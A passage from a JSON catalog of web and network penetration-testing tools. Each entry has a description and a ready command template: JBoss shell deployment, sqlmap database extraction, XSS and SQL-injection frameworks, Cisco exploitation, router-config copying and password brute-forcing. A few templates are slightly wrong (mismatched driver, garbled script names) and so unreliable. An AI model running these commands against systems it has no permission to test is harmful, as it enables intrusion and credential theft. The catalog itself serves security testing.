    "name": "jboss-autopwn-linux",
    "desc": "This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.\r\n\r\nFeatures include:\r\nMultiplatform support – tested on Windows, Linux and Mac targets\r\nSupport for bind and reverse bind shells\r\nMeterpreter shells and VNC support for Windows targets",
    "example": "Attack the target server (192.168.1.200) on the specified port (8080), redirecting stderr (2> /dev/null):\r\njboss-linux 192.168.1.200 8080 2> /dev/null",
    "category": "3",
    "customInput": "",
    "cmd": "jboss-linux ${target} ${port} 2> /dev/null",
    "parser": null
  },
  {
    "name": "joomscan",
    "desc": "OWASP JoomScan (short for [Joom]la Vulnerability [Scan]ner) is an opensource project in perl programming language to detect Joomla CMS vulnerabilities and analysis them.\r\n\r\nWhy OWASP JoomScan ?\r\nIf you want to do a penetration test on a Joomla CMS, OWASP JoomScan is Your best shot ever! This Project is being faster than ever and updated with the latest Joomla vulnerabilities.",
    "example": "Scan the Joomla installation at the given URL (-u http://192.168.1.202/joomla) for vulnerabilities:\r\njoomscan -u http://192.168.1.202/joomla",
    "category": "4",
    "customInput": "URL to server, and Joomla web app=${arg1},",
    "cmd": "joomscan -u ${arg1}",
    "parser": null
  },
  {
    "name": "jSQL Injection (GUI)",
    "desc": "jSQL Injection is a lightweight application used to find database information from a distant server. jSQL Injection is free, open source and cross-platform (Windows, Linux, Mac OS X, Solaris).",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "jsql",
    "parser": null
  },
  {
    "name": "Maltego (GUI)",
    "desc": "Maltego is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. Maltego’s unique advantage is to demonstrate the complexity and severity of single points of failure as well as trust relationships that exist currently within the scope of your infrastructure.\r\n\r\nThe unique perspective that Maltego offers to both network and resource based entities is the aggregation of information posted all over the internet – whether it’s the current configuration of a router poised on the edge of your network or the current whereabouts of your Vice President on his international visits, Maltego can locate, aggregate and visualize this information.\r\n\r\nMaltego offers the user with unprecedented information. Information is leverage. Information is power. Information is Maltego.\r\n\r\nWhat does Maltego do?\r\n\r\nMaltego is a program that can be used to determine the relationships and real world links between:\r\n\r\nPeople\r\nGroups of people (social networks)\r\nCompanies\r\nOrganizations\r\nWeb sites\r\nInternet infrastructure such as:\r\nDomains\r\nDNS names\r\nNetblocks\r\nIP addresses\r\nPhrases\r\nAffiliations\r\nDocuments and files\r\nThese entities are linked using open source intelligence.\r\nMaltego is easy and quick to install – it uses Java, so it runs on Windows, Mac and Linux.\r\nMaltego provides you with a graphical interface that makes seeing these relationships instant and accurate – making it possible to see hidden connections.\r\nUsing the graphical user interface (GUI) you can see relationships easily – even if they are three or four degrees of separation away.\r\nMaltego is unique because it uses a powerful, flexible framework that makes customizing possible. As such, Maltego can be adapted to your own, unique requirements.",
    "example": "",
    "category": "1",
    "customInput": "",
    "cmd": "No_CLI",
    "parser": null
  },
  {
    "name": "Nikto",
    "desc": "Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.",
    "example": "nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 192.168.0.102",
    "category": "4",
    "customInput": "",
    "cmd": "nikto -Display 1234EP -o ${working_dir}/intel/nikto.html -Format htm -Tuning 123bde -host ${target}",
    "parser": null
  },
  {
    "name": "PadBuster (NOT DONE)",
    "desc": "PadBuster is a Perl script for automating Padding Oracle Attacks. PadBuster provides the capability to decrypt arbitrary ciphertext, encrypt arbitrary plaintext, and perform automated response analysis to determine whether a request is vulnerable to padding oracle attacks.\r\n\r\nRead:\r\nhttps://pentesterlab.com/exercises/padding_oracle/course\r\n\r\nUse: padBuster.pl URL EncryptedSample BlockSize [options]",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "Paros (GUI)",
    "desc": "A Java based HTTP/HTTPS proxy for assessing web application vulnerability. It supports editing/viewing HTTP messages on-the-fly. Other featuers include spiders, client certificate, proxy-chaining, intelligent scanning for XSS and SQL injections etc.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "paros",
    "parser": null
  },
  {
    "name": "Parsero",
    "desc": "Parsero is a free script written in Python which reads the Robots.txt file of a web server and looks at the Disallow entries. The Disallow entries tell the search engines what directories or files hosted on a web server mustn’t be indexed. For example, “Disallow: /portal/login” means that the content on www.example.com/portal/login it’s not allowed to be indexed by crawlers like Google, Bing, Yahoo… This is the way the administrator have to not share sensitive or private information with the search engines.\r\n\r\nBut sometimes these paths typed in the Disallows entries are directly accessible by the users without using a search engine, just visiting the URL and the Path, and sometimes they are not available to be visited by anybody… Because it is really common that the administrators write a lot of Disallows and some of them are available and some of them are not, you can use Parsero in order to check the HTTP status code of each Disallow entry in order to check automatically if these directories are available or not.\r\n\r\nAlso, the fact the administrator write a robots.txt, it doesn’t mean that the files or directories typed in the Dissallow entries will not be indexed by Bing, Google, Yahoo… For this reason, Parsero is capable of searching in Bing to locate content indexed without the web administrator authorization. Parsero will check the HTTP status code in the same way for each Bing result.",
    "example": "Search for results from a website (-u www.bing.com) using Bing indexed Disallows (-sb):\r\nparsero -u www.bing.com -sb",
    "category": "4",
    "customInput": "",
    "cmd": "parsero -u http://${target} -sb",
    "parser": null
  },
  {
    "name": "plecost",
    "desc": "WordPress finger printer tool, plecost search and retrieve information about the plugins versions installed in WordPress systems. It can analyze a single URL or perform an analysis based on the results indexed by Google. Additionally displays CVE code associated with each plugin, if there. Plecost retrieves the information contained on Web sites supported by WordPress, and also allows a search on the results indexed by Google.",
    "example": "Use 100 plugins (-n 100), sleep for 10 seconds between probes (-s 10) but no more than 15 (-M 15) and use the plugin list (-i /usr/share/plecost/wp_plugin_list.txt) to scan the given URL (192.168.1.202/wordpress):\r\nplecost -n 100 -s 10 -M 15 -i /usr/share/plecost/wp_plugin_list.txt 192.168.1.202/wordpress",
    "category": "4",
    "customInput": "",
    "cmd": "plecost -n 100 -s 10 -M 15 -i /usr/share/plecost/wp_plugin_list.txt ${target}/wordpress",
    "parser": null
  },
  {
    "name": "Powerfuzzer (GUI)",
    "desc": "Powerfuzzer is a highly automated and fully customizable web fuzzer (HTTP protocol based application fuzzer) based on many other Open Source fuzzers available and information gathered from numerous security resources and websites. It was designed to be user friendly, modern, effective and working.\r\n\r\nCurrently, it is capable of identifying these problems:\r\n\r\nCross Site Scripting (XSS)\r\nInjections (SQL, LDAP, code, commands, and XPATH)\r\nCRLF\r\nHTTP 500 statuses (usually indicative of a possible misconfiguration/security flaw incl. buffer overflow)\r\nDesigned and coded to be modular and extendable. Adding new checks should simply entail adding new methods.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "powerfuzzer",
    "parser": null
  },
  {
    "name": "ProxyStrike (GUI)",
    "desc": "ProxyStrike is an active Web Application Proxy. It’s a tool designed to find vulnerabilities while browsing an application. It was created because the problems we faced in the pentests of web applications that depends heavily on Javascript, not many web scanners did it good in this stage, so we came with this proxy.\r\n\r\nRight now it has available Sql injection and XSS plugins. Both plugins are designed to catch as many vulnerabilities as we can, it’s that why the SQL Injection plugin is a Python port of the great DarkRaver “Sqlibf”.\r\n\r\nThe process is very simple, ProxyStrike runs like a proxy listening in port 8008 by default, so you have to browse the desired web site setting your browser to use ProxyStrike as a proxy, and ProxyStrike will analyze all the paremeters in background mode. For the user is a passive proxy because you won’t see any different in the behaviour of the application, but in the background is very active. :)\r\n\r\nSome features:\r\n\r\nPlugin engine (Create your own plugins!)\r\nRequest interceptor\r\nRequest diffing\r\nRequest repeater\r\nAutomatic crawl process\r\nHttp request/response history\r\nRequest parameter stats\r\nRequest parameter values stats\r\nRequest url parameter signing and header field signing\r\nUse of an alternate proxy (tor for example ;D )\r\nSql attacks (plugin)\r\nServer Side Includes (plugin)\r\nXss attacks (plugin)\r\nAttack logs\r\nExport results to HTML or XML",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "proxystrike",
    "parser": null
  },
  {
    "name": "Skipfish",
    "desc": "Skipfish is an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments.\r\n\r\nKey features:\r\nHigh speed: pure C code, highly optimized HTTP handling, minimal CPU footprint – easily achieving 2000 requests per second with responsive targets.\r\nEase of use: heuristics to support a variety of quirky web frameworks and mixed-technology sites, with automatic learning capabilities, on-the-fly wordlist creation, and form autocompletion.\r\nCutting-edge security logic: high quality, low false positive, differential security checks, capable of spotting a range of subtle flaws, including blind injection vectors.",
    "example": "Using the given directory for output (-o 202) , scan the web application URL (http://192.168.1.202/wordpress):\r\nskipfish -o 202 http://192.168.1.202/wordpress",
    "category": "4",
    "customInput": "",
    "cmd": "skipfish -o ${working_dir}/intel ${target}",
    "parser": null
  },
  {
    "name": "sqlmap",
    "desc": "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.\r\n\r\nFeatures:\r\nFull support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB database management systems.\r\nFull support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query, stacked queries and out-of-band.\r\nSupport to directly connect to the database without passing via a SQL injection, by providing DBMS credentials, IP address, port and database name.\r\nSupport to enumerate users, password hashes, privileges, roles, databases, tables and columns.\r\nAutomatic recognition of password hash formats and support for cracking them using a dictionary-based attack.\r\nSupport to dump database tables entirely, a range of entries or specific columns as per user’s choice. The user can also choose to dump only a range of characters from each column’s entry.\r\nSupport to search for specific database names, specific tables across all databases or specific columns across all databases’ tables. This is useful, for instance, to identify tables containing custom application credentials where relevant columns’ names contain string like name and pass.\r\nSupport to download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.\r\nSupport to execute arbitrary commands and retrieve their standard output on the database server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.\r\nSupport to establish an out-of-band stateful TCP connection between the attacker machine and the database server underlying operating system. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user’s choice.\r\nSupport for database process’ user privilege escalation via Metasploit’s Meterpreter getsystem command.",
    "example": "Attack the given URL (-u “http://192.168.1.250/?p=1&forumaction=search”) and extract the database names (–dbs):\r\nsqlmap -u \"http://192.168.1.250/?p=1&forumaction=search\" --dbs",
    "category": "4",
    "customInput": "URL of page to test=${arg1},Additional options (if you want to use tor type --tor)=${arg2},",
    "cmd": "sqlmap -u \"${arg1}\" --dbs ${arg2}",
    "parser": null
  },
  {
    "name": "Sqlninja (NOT DONE)",
    "desc": "Fancy going from a SQL Injection on Microsoft SQL Server to a full GUI access on the DB? Take a few new SQL Injection tricks, add a couple of remote shots in the registry to disable Data Execution Prevention, mix with a little Perl that automatically generates a debug script, put all this in a shaker with a Metasploit wrapper, shake well and you have just one of the attack modules of sqlninja!\r\n\r\nSqlninja is a tool targeted to exploit SQL Injection vulnerabilities on a web application that uses Microsoft SQL Server as its back-end.\r\n\r\nIts main goal is to provide a remote access on the vulnerable DB server, even in a very hostile environment. It should be used by penetration testers to help and automate the process of taking over a DB Server when a SQL Injection vulnerability has been discovered.\r\n\r\nRead:\r\nhttp://sqlninja.sourceforge.net/sqlninja-howto.html",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "sqlsus (INTERACTIVE)",
    "desc": "sqlsus is an open source MySQL injection and takeover tool, written in perl.\r\n\r\nVia a command line interface, you can retrieve the database(s) structure, inject your own SQL queries (even complex ones), download files from the web server, crawl the website for writable directories, upload and control a backdoor, clone the database(s), and much more…\r\nWhenever relevant, sqlsus will mimic a MySQL console output.\r\n\r\nsqlsus focuses on speed and efficiency, optimizing the available injection space, making the best use (I can think of) of MySQL functions.\r\nIt uses stacked subqueries and an powerful blind injection algorithm to maximize the data gathered per web server hit.\r\nUsing multi-threading on top of that, sqlsus is an extremely fast database dumper, be it for inband or blind injection.\r\n\r\nIf the privileges are high enough, sqlsus will be a great help for uploading a backdoor through the injection point, and takeover the web server.\r\n\r\nIt uses SQLite as a backend, for an easier use of what has been dumped, and integrates a lot of usual features (see below) such as cookie support, socks/http proxying, https.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "ua-tester",
    "desc": "This tool is designed to automatically check a given URL using a list of standard and non-standard User Agent strings provided by the user (1 per line). The results of these checks are then reported to the user for further manual analysis where required.\r\n./UATester.py -u www.example.com -f ./useragentlist.txt -v\r\n./UATester.py -u https://www.wordpress.com\r\n./UATester.py -u http://www.defaultserver.com -v --debug\r\n./UATester.py -u facebook.com -v -d MDBX\r\n./UATester.py -u https://www.google.com -s \"MySpecialUserAgent\"\r\n./UATester.py -u blog.c22.cc -d MC -o ./output.csv",
    "example": "Connect to the URL (-u http://192.168.1.202/joomla) and use mobile device User-Agent strings (-d M) to check for different content:\r\nua-tester -u http://192.168.1.202/joomla -d M",
    "category": "4",
    "customInput": "Target URL=${arg1},",
    "cmd": "ua-tester -u ${arg1} -d M",
    "parser": null
  },
  {
    "name": "Uniscan",
    "desc": "Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.",
    "example": "Scan the given URL (-u http://192.168.1.202/) for vulnerabilities, enabling directory and dynamic checks (-qd):\r\nuniscan -u http://192.168.1.202/ -qd",
    "category": "4",
    "customInput": "",
    "cmd": "uniscan -u http://${target} -qd",
    "parser": null
  },
  {
    "name": "Vega (GUI)",
    "desc": "Vega is a free and open source scanner and testing platform to test the security of web applications. Vega can help you find and validate SQL Injection, Cross-Site Scripting (XSS), inadvertently disclosed sensitive information, and other vulnerabilities. It is written in Java, GUI based, and runs on Linux, OS X, and Windows.\r\n\r\nVega includes an automated scanner for quick tests and an intercepting proxy for tactical inspection. The Vega scanner finds XSS (cross-site scripting), SQL injection, and other vulnerabilities. Vega can be extended using a powerful API in the language of the web: Javascript.\r\n\r\nAutomated Crawler and Vulnerability Scanner\r\nConsistent UI\r\nWebsite Crawler\r\nIntercepting Proxy\r\nSSL MITM\r\nContent Analysis\r\nExtensibility through a Powerful Javascript Module API\r\nCustomizable alerts\r\nDatabase and Shared Data Model",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "vega",
    "parser": null
  },
  {
    "name": "w3af (GUI)",
    "desc": "w3af is a Web Application Attack and Audit Framework which aims to identify and exploit all web application vulnerabilities. This package provides a graphical user interface (GUI) for the framework. If you want a command-line application only, install w3af-console. The framework has been called the “metasploit for the web”, but it’s actually much more than that, because it also discovers the web application vulnerabilities using black-box scanning techniques!. The w3af core and it’s plugins are fully written in Python. The project has more than 130 plugins, which identify and exploit SQL injection, cross site scripting (XSS), remote file inclusion and more.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "w3af",
    "parser": null
  },
  {
    "name": "WebScarab (GUI)",
    "desc": "WebScarab is designed to be a tool for anyone who needs to expose the workings of an HTTP(S) based application, whether to allow the developer to debug otherwise difficult problems, or to allow a security specialist to identify vulnerabilities in the way that the application has been designed or implemented.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "webscarab",
    "parser": null
  },
  {
    "name": "Webshag",
    "desc": "Webshag is a multi-threaded, multi-platform web server audit tool. Written in Python, it gathers commonly useful functionalities for web server auditing like website crawling, URL scanning or file fuzzing.\r\n\r\nWebshag can be used to scan a web server in HTTP or HTTPS, through a proxy and using HTTP authentication (Basic and Digest). In addition to that it proposes innovative IDS evasion functionalities aimed at making correlation between request more complicated (e.g. use a different random per request HTTP proxy server).",
    "example": "Run a port scan (-m pscan) on the remote IP address (192.168.1.202):\r\nwebshag-cli -m pscan 192.168.1.202",
    "category": "4",
    "customInput": "",
    "cmd": "webshag-cli -m pscan ${target}",
    "parser": null
  },
  {
    "name": "WebSlayer (GUI)",
    "desc": "Webslayer is a tool designed for brute forcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts,files, etc), brute force GET and POST parameters, bruteforce Forms parameters (User/Password), Fuzzing, etc. The tools has a payload generator and an easy and powerful results analyzer.\r\n\r\nYou can perform attacks like:\r\n\r\nPredictable resource locator, recursion supported (Discovery)\r\nLogin forms brute force\r\nSession brute force\r\nParameter brute force\r\nParameter fuzzing and injection (XSS, SQL)\r\nBasic and Ntml authentication brute forcing\r\nSome features:\r\n\r\nRecursion\r\nEncodings: 15 encodings supported\r\nAuthentication: supports Ntml and Basic\r\nMultiple payloads: you can use 2 payloads in different parts\r\nProxy support (authentication supported)\r\nFor predictable resource location it has: Recursion, common extensions, non standard code detection\r\nMultiple filters for improving the performance and for producing cleaner results\r\nLive filters\r\nMultithreads\r\nSession saving\r\nIntegrated browser (webKit)\r\nTime delay between requests\r\nAttack balancing across multiple proxies\r\nPredefined dictionaries for predictable resource location, based on known servers",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "webslayer",
    "parser": null
  },
  {
    "name": "WebSploit (INTERACTIVE)",
    "desc": "WebSploit Is An Open Source Project For:\r\n\r\nSocial Engineering Works\r\nScan,Crawler & Analysis Web\r\nAutomatic Exploiter\r\nSupport Network Attacks\r\nAutopwn – Used From Metasploit For Scan and Exploit Target Service\r\nwmap – Scan,Crawler Target Used From Metasploit wmap plugin\r\nformat infector – inject reverse & bind payload into file format\r\nphpmyadmin Scanner\r\nCloudFlare resolver\r\nLFI Bypasser\r\nApache Users Scanner\r\nDir Bruter\r\nadmin finder\r\nMLITM Attack – Man Left In The Middle, XSS Phishing Attacks\r\nMITM – Man In The Middle Attack\r\nJava Applet Attack\r\nMFOD Attack Vector\r\nUSB Infection Attack\r\nARP Dos Attack\r\nWeb Killer Attack\r\nFake Update Attack\r\nFake Access point Attack\r\nWifi Honeypot\r\nWifi Jammer\r\nWifi Dos\r\nBluetooth POD Attack",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "websploit",
    "parser": null
  },
  {
    "name": "Wfuzz",
    "desc": "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.\r\n\r\nSome features:\r\n\r\nMultiple Injection points capability with multiple dictionaries\r\nRecursion (When doing directory bruteforce)\r\nPost, headers and authentication data brute forcing\r\nOutput to HTML\r\nColored output\r\nHide results by return code, word numbers, line numbers, regex\r\nCookies fuzzing\r\nMulti threading\r\nProxy support\r\nSOCK support\r\nTime delays between requests\r\nAuthentication support (NTLM, Basic)\r\nAll parameters bruteforcing (POST and GET)\r\nMultiple encoders per payload\r\nPayload combinations with iterators\r\nBaseline request (to filter results against)\r\nBrute force HTTP methods\r\nMultiple proxy support (each request through a different proxy)\r\nHEAD scan (faster for resource discovery)\r\nDictionaries tailored for known applications (Weblogic, Iplanet, Tomcat, Domino, Oracle 9i, Vignette, Coldfusion and many more",
    "example": "Use colour output (-c), a wordlist as a payload (-z file,/usr/share/wfuzz/wordlist/general/common.txt), and hide 404 messages (–hc 404) to fuzz the given URL (http://192.168.1.202/FUZZ):\r\nwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ",
    "category": "4",
    "customInput": "Wordlist (/usr/share/wfuzz/wordlist/general/common.txt)=${arg1},URL/page to attack=${arg2},",
    "cmd": "wfuzz -c -z file,${arg1} --hc 404 ${arg2}",
    "parser": null
  },
  {
    "name": "WhatWeb",
    "desc": "WhatWeb identifies websites. Its goal is to answer the question, “What is that Website?”. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.\r\n\r\nWhatWeb can be stealthy and fast, or thorough but slow. WhatWeb supports an aggression level to control the trade off between speed and reliability. When you visit a website in your browser, the transaction includes many hints of what web technologies are powering that website. Sometimes a single webpage visit contains enough information to identify a website but when it does not, WhatWeb can interrogate the website further. The default level of aggression, called ‘stealthy’, is the fastest and requires only one HTTP request of a website. This is suitable for scanning public websites. More aggressive modes were developed for use in penetration tests.\r\n\r\nMost WhatWeb plugins are thorough and recognise a range of cues from subtle to obvious. For example, most WordPress websites can be identified by the meta HTML tag, e.g. “, but a minority of WordPress websites remove this identifying tag but this does not thwart WhatWeb. The WordPress WhatWeb plugin has over 15 tests, which include checking the favicon, default installation files, login pages, and checking for “/wp-content/” within relative links.\r\n\r\nFeatures:\r\nOver 1700 plugins\r\nControl the trade off between speed/stealth and reliability\r\nPlugins include example URLs\r\nPerformance tuning. Control how many websites to scan concurrently.\r\nMultiple log formats: Brief (greppable), Verbose (human readable), XML, JSON, MagicTree, RubyObject, MongoDB, SQL, and ElasticSearch.\r\nProxy support including TOR\r\nCustom HTTP headers\r\nBasic HTTP authentication\r\nControl over webpage redirection\r\nNmap-style IP ranges\r\nFuzzy matching\r\nResult certainty awareness\r\nCustom plugins defined on the command line",
    "example": "whatweb -v -a 3 192.168.0.102",
    "category": "4",
    "customInput": "",
    "cmd": "whatweb -v -a 3 ${target}",
    "parser": null
  },
  {
    "name": "WPScan",
    "desc": "WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.",
    "example": "Scan a target WordPress URL and enumerate any plugins that are installed:\r\nwpscan --url http://wordpress.local --enumerate p",
    "category": "4",
    "customInput": "",
    "cmd": "wpscan --url http://${target} --enumerate p",
    "parser": null
  },
  {
    "name": "XSSer-simple",
    "desc": "Cross Site “Scripter” (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications. It contains several options to try to bypass certain filters, and various special techniques of code injection.\r\nRead:\r\nhttps://xsser.03c8.net/#docs",
    "example": "Simple injection from URL:\r\nxsser -u \"http://host.com\"",
    "category": "4",
    "customInput": "",
    "cmd": "xsser -u \"http://${target} \"",
    "parser": null
  },
  {
    "name": "XSSer-simple-hidden",
    "desc": "Cross Site “Scripter” (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications. It contains several options to try to bypass certain filters, and various special techniques of code injection.\r\nRead:\r\nhttps://xsser.03c8.net/#docs",
    "example": "Simple injection from File, with Tor proxy and spoofing HTTP Referer headers:\r\nxsser -i \"file.txt\" --proxy \"http://127.0.0.1:8118\" --referer \"192.168.54.2\"",
    "category": "4",
    "customInput": "Tor proxy(http://127.0.0.1:8118)=${arg1},",
    "cmd": "xsser -u \"http://${target} \" --proxy \"${arg1}\" --referer \"192.168.54.2\"",
    "parser": null
  },
  {
    "name": "zaproxy (GUI)",
    "desc": "The OWASP Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing as well as being a useful addition to an experienced pen testers toolbox.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "zaproxy",
    "parser": null
  },
  {
    "name": "Httrack",
    "desc": "Web site scraper",
    "example": "httrack http://www.webscantest.com -O /tmp/webscantest",
    "category": "4",
    "customInput": "URL=${arg1},",
    "cmd": "httrack ${arg1} -O ${working_dir}/intel/httrack",
    "parser": null
  },
  {
    "name": "BBQSQL (INTERACTIVE)",
    "desc": "Blind SQL injection can be a pain to exploit. When the available tools work they work well, but when they don’t you have to write something custom. This is time-consuming and tedious. BBQSQL can help you address those issues.\r\n\r\nBBQSQL is a blind SQL injection framework written in Python. It is extremely useful when attacking tricky SQL injection vulnerabilities. BBQSQL is also a semi-automatic tool, allowing quite a bit of customization for those hard to trigger SQL injection findings. The tool is built to be database agnostic and is extremely versatile. It also has an intuitive UI to make setting up attacks much easier. Python gevent is also implemented, making BBQSQL extremely fast.\r\n\r\nSimilar to other SQL injection tools you provide certain request information.\r\n\r\nMust provide the usual information:\r\nURL\r\nHTTP Method\r\nHeaders\r\nCookies\r\nEncoding methods\r\nRedirect behavior\r\nFiles\r\nHTTP Auth\r\nProxies\r\nThen specify where the injection is going and what syntax we are injecting.",
    "example": "",
    "category": "2",
    "customInput": "",
    "cmd": "bbqsql",
    "parser": null
  },
  {
    "name": "BED",
    "desc": "BED is a program which is designed to check daemons for potential buffer overflows, format strings et. al.\r\n<plugin>   = FTP/SMTP/POP/HTTP/IRC/IMAP/PJL/LPD/FINGER/SOCKS4/SOCKS5",
    "example": "Use the HTTP plugin (-s HTTP) to fuzz the target server (-t 192.168.1.15):\r\nbed -s HTTP -t 192.168.1.15",
    "category": "2",
    "customInput": "Plugin(FTP/SMTP/POP/HTTP/IRC/IMAP/PJL/LPD/FINGER/SOCKS4/SOCKS5)=${arg1},",
    "cmd": "bed -s ${arg1} -t ${target}",
    "parser": null
  },
  {
    "name": "cisco-auditing-tool",
    "desc": "Perl script which scans cisco routers for common vulnerabilities.",
    "example": "Scan the host (-h 192.168.99.230) on port 23 (-p 23), using a password dictionary file (-a /usr/share/wordlists/nmap.lst):\r\nCAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst",
    "category": "2",
    "customInput": "Port=${arg1},Password list=${arg2},",
    "cmd": "CAT -h ${target} -p ${arg1} -a ${arg2}",
    "parser": null
  },
  {
    "name": "cisco-ocs",
    "desc": "A mass vulnerability Cisco scanning tool.",
    "example": "Attempt to exploit Cisco devices in the given IP range (192.168.99.200 192.168.99.202):\r\ncisco-ocs 192.168.99.200 192.168.99.202",
    "category": "2",
    "customInput": "Start IP=${arg1},End IP=${arg2},",
    "cmd": "cisco-ocs ${arg1} ${arg2}",
    "parser": null
  },
  {
    "name": "cisco-torch",
    "desc": "Cisco Torch mass scanning, fingerprinting, and exploitation tool was written while working on the next edition of the “Hacking Exposed Cisco Networks”, since the tools available on the market could not meet our needs.\r\n\r\nThe main feature that makes Cisco-torch different from similar tools is the extensive use of forking to launch multiple scanning processes on the background for maximum scanning efficiency. Also, it uses several methods of application layer fingerprinting simultaneously, if needed. We wanted something fast to discover remote Cisco hosts running Telnet, SSH, Web, NTP and SNMP services and launch dictionary attacks against the services discovered.",
    "example": "Run all available scan types (-A) against the target IP address (192.168.99.202):\r\ncisco-torch -A 192.168.99.202",
    "category": "2",
    "customInput": "Target IP=${arg1},",
    "cmd": "cisco-torch -A ${arg1}",
    "parser": null
  },
  {
    "name": "copy-router-config",
    "desc": "Copies configuration files from Cisco devices running SNMP.",
    "example": "Usage : ./copy-copy-config.pl <router-ip> <tftp-serverip> <community>\r\nMake sure a TFTP server is set up, preferably running from /tmp !",
    "category": "2",
    "customInput": "Router IP=${arg1},TFTP Server IP=${arg2},",
    "cmd": "copy-copy-config.pl ${arg1} ${arg2} private",
    "parser": null
  },
  {
    "name": "merge-router-config",
    "desc": "Merge configuration files from Cisco devices running SNMP.",
    "example": "Merges Cisco configs via SNMP\r\nmerge-router-config.pl 192.168.1.1 192.168.1.15 private",
    "category": "2",
    "customInput": "Router IP=${arg1},TFTP Server IP=${arg2},",
    "cmd": "merge-copy-config.pl ${arg1} ${arg2} private",
    "parser": null
  },
  {
    "name": "DBPwAudit-mysql",
    "desc": "DBPwAudit is a Java tool that allows you to perform online audits of password quality for several database engines. The application design allows for easy adding of additional database drivers by simply copying new JDBC drivers to the jdbc directory. Configuration is performed in two files, the aliases.conf file is used to map drivers to aliases and the rules.conf tells the application how to handle error messages from the scan.\r\n\r\nThe tool has been tested and known to work with:\r\nMicrosoft SQL Server 2000/2005\r\nOracle 8/9/10/11\r\nIBM DB2 Universal Database\r\nMySQL",
    "example": "Scan the SQL server (-s 192.168.1.130), using the specified database (-d testdb) and driver\r\n(-D MySQL) using the root username (-U root) and password dictionary (-P /usr/share/wordlists/nmap.lst):\r\ndbpwaudit -s 192.168.1.130 -d testdb -D MySQL -U root -P /usr/share/wordlists/nmap.lst",
    "category": "2",
    "customInput": "",
    "cmd": "dbpwaudit -s ${target} -d testdb -D MySQL -U root -P ${pass_file}",
    "parser": null
  },
  {
    "name": "DBPwAudit-mssql",
    "desc": "DBPwAudit is a Java tool that allows you to perform online audits of password quality for several database engines. The application design allows for easy adding of additional database drivers by simply copying new JDBC drivers to the jdbc directory. Configuration is performed in two files, the aliases.conf file is used to map drivers to aliases and the rules.conf tells the application how to handle error messages from the scan.\r\n\r\nThe tool has been tested and known to work with:\r\nMicrosoft SQL Server 2000/2005\r\nOracle 8/9/10/11\r\nIBM DB2 Universal Database\r\nMySQL\r\nThe tool is pre-configured for these drivers but does not ship with them, due to licensing issues.",
    "example": "Scan the SQL server (-s 192.168.1.130), using the specified database (-d testdb) and driver\r\n(-D MsSQL) using the root username (-U root) and password dictionary (-P /usr/share/wordlists/nmap.lst):\r\ndbpwaudit -s 192.168.1.130 -d testdb -D MySQL -U root -P /usr/share/wordlists/nmap.lst",
    "category": "2",
    "customInput": "",
    "cmd": "dbpwaudit -s ${target} -d testdb -D MySQL -U root -P ${pass_file}",
    "parser": null
  },
  {
    "name": "Doona",
    "desc": "Doona is a fork of the Bruteforce Exploit Detector Tool (BED). BED is a program which is designed to check daemons for potential buffer overflows, format string bugs etc.\r\nDoona is Australian for duvet. It adds a significant number of features/changes to BED.",
